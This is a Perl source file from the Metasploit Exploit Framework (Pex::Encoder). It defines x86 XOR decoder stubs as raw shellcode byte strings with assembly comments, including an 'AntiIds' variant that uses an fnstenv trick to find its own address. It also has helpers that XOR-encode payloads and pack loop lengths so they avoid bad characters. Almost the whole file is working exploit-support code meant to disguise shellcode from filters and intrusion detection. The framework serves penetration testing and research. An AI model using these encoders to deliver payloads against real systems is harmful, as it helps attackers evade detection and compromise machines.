
###############

##
#         Name: Encoder.pm
#       Author: H D Moore <hdm [at] metasploit.com>
#       Author: spoonm <ninjatools [at] hush.com>
#      Version: $Revision$
#      License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
##

package Pex::Encoder;
use strict;
use Pex::Text;
use Pex::Encoding::XorDword;
use Pex::Encoding::XorWord;


# These are the left behinds that haven't mad themselves into a Metasploit
# encoder module.

#
# These are the current x86 decoders, all of them are static
# at the moment, but tend to meet the needs of most exploits.
#

sub XorDecoderDwordAntiIds {
    my ($arch, $xor, $len, $xbadc) = @_;
    if(! $len) { $len = 0x200 }

    
    if (lc($arch) eq "x86")
    {
        # this xor decoder was written by spoonm <ninjatools [at] hush.com>
	    my $smallVersion = 0;
        
        # Pad to a 4 byte boundary, the xor data should already be padded
        # but just incase.
        my $loopCounter = int(($len - 1) / 4) + 1;
        $loopCounter *= -1;

        my $xorlen = pack("V", $loopCounter);
        my $xorkey = pack("V", $xor);
        

        # this anti-0xff encoder written by hdm [at] metasploit.com
        if (index($xbadc, "\xff") != -1)
        {

            # try sub len, then add len
            my $loopmode = "sub";
            my $lenops = "\x66\x81\xe9";
            $xorlen = pack("v", $loopCounter);
            
            if (Pex::Text::CharsInBuffer($xorlen, $xbadc))
            {
                $xorlen = pack("v", abs($loopCounter));
                $lenops = "\x66\x81\xc1";
                $loopmode = "add";
            }
            
            if (Pex::Text::CharsInBuffer($xorlen, $xbadc) && $loopCounter < 128)
            {
                $xorlen = chr(abs($loopCounter)) . "\x59\x90\x90";
                $lenops = "\x6a";
                $loopmode = "push";
            }
            
            if (! Pex::Text::CharsInBuffer($xorlen, $xbadc))
            {
                my $decoder = 
                "\xd9\xe1".                 # fabs
                "\xd9\x34\x24".             # fnstenv (%esp,1)
                "\x5b".                     # pop    %ebx
                "\x5b".                     # pop    %ebx
                "\x5b".                     # pop    %ebx
                "\x5b".                     # pop    %ebx
                "\x80\xc3\x1f".             # add    $0x1f,%ebx
                "\x31\xc9".                 # xor    %ecx,%ecx
                $lenops . $xorlen.          # stick loop cnt into ecx
                "\x81\x33" .$xorkey.        # xorl   $0x69696969,(%ebx)
                "\x43".                     # inc    %ebx
                "\x43".                     # inc    %ebx
                "\x43".                     # inc    %ebx
                "\x43".                     # inc    %ebx
                "\xe2\xf4";                 # loop   a0000013 <_start+0x13>
                return $decoder;
            }
        }
    }
}







sub XorDecoderWord {
    my ($arch, $xor, $len) = @_;
    if(! $len) { $len = 0x200 }

    # this xor decoder was written by hdm [at] metasploit.com
    if (lc($arch) eq "x86")
    {
        my $div = $len / 2;
        if ($len - (int($div) * 2) > 0) { $div++ }

        my $xorlen = pack("v", (0xffff - $div));
        my $xorkey = pack("v", $xor);

        my $decoder =
            "\xeb\x13".                     # jmp 8048095 <short_xor_end>
            # short_xor_beg:
            "\x5e".                         # pop %esi
            "\x31\xc9".                     # xor %ecx,%ecx
            "\x66\x81\xe9". $xorlen .       # sub $0xfff4,%cx
            # short_xor_xor:
            "\x66\x81\x36". $xorkey .       # xorw $0x1234,(%esi)
            "\x46".                         # inc %esi
            "\x46".                         # inc %esi
            "\xe2\xf7".                     # loop 804808a <short_xor_xor>
            "\xeb\x05".                     # jmp 804809a <short_xor_don>
            # short_xor_end:
            "\xe8\xe8\xff\xff\xff";         # call 8048082 <short_xor_beg>
        return $decoder;
    }
    return;
}

sub XorDecoderByte {
    my ($arch, $xor, $len) = @_;
    if(! $len) { $len = 0x200 }

    # this xor decoder was written by hdm [at] metasploit.com
    if (lc($arch) eq "x86")
    {
        $len = pack("v", 0xffff - $len);

        return
        "\xd9\xe1".                     # fabs
        "\xd9\x34\x24".                 # fnstenv (%esp,1)
        "\x5b".                         # pop %ebx
        "\x5b".                         # pop %ebx
        "\x5b".                         # pop %ebx
        "\x5b".                         # pop %ebx
        "\x80\xeb\xe7".                 # sub $0xe7,%ebx
        # short_xor_beg:
        "\x31\xc9".                     # xor %ecx,%ecx
        "\x66\x81\xe9$len".             # sub $len,%cx
        "\x80\x33". chr($xor).          # xorb $0x69,(%ebx)
        "\x43".                         # inc %ebx
        "\xe2\xfa";                     # loop 8048093 <short_xor_xor>
    }
    return;
}

# Pack a length in a lot of different ways...
sub PackLength {
  my $len = shift;
  my $data = { 'small' => 0 };

  # Pad to a 4 byte boundary
  my $loopCounter = int(($len - 1) / 4) + 1;

  $data->{'padLength'} = $loopCounter;
  $data->{'negPadLength'} = -1 * $loopCounter;
  $data->{'length'} = pack('V', $data->{'padLength'});
  $data->{'negLength'} = pack('V', $data->{'negPadLength'});

  $data->{'negSmall'} = 1 if($data->{'negPadLength'} >= -128);
  $data->{'small'}    = 1 if($data->{'padLength'} <= 127);
  $data->{'lengthByte'} = substr($data->{'length'}, 0, 1);
  $data->{'negLengthByte'} = substr($data->{'negLength'}, 0, 1);
  $data->{'lengthWord'} = substr($data->{'length'}, 0, 2);
  $data->{'negLengthWord'} = substr($data->{'negLength'}, 0, 2);

  return($data);
}

#
# These routines take a buffer and xor encodes it with the given key
# value. The data is aligned to keysize blocks and padded with xor'd
# null values (to prevent pad ^ key problems)
#

# Moved the keyscan/encoding stuff into the Pex::Encoding classes
sub XorDword {
  return(Pex::Encoding::XorDword->Encode(@_));
}

sub XorWord {
  return(Pex::Encoding::XorWord->Encode(@_));
}

sub XorByte {
    my ($xor, $buffer) = @_;
    my $res;

    foreach my $char (split(//, $buffer))
    {
        $res .= chr(ord($char) ^ $xor);
    }
    return $res;
}


1;
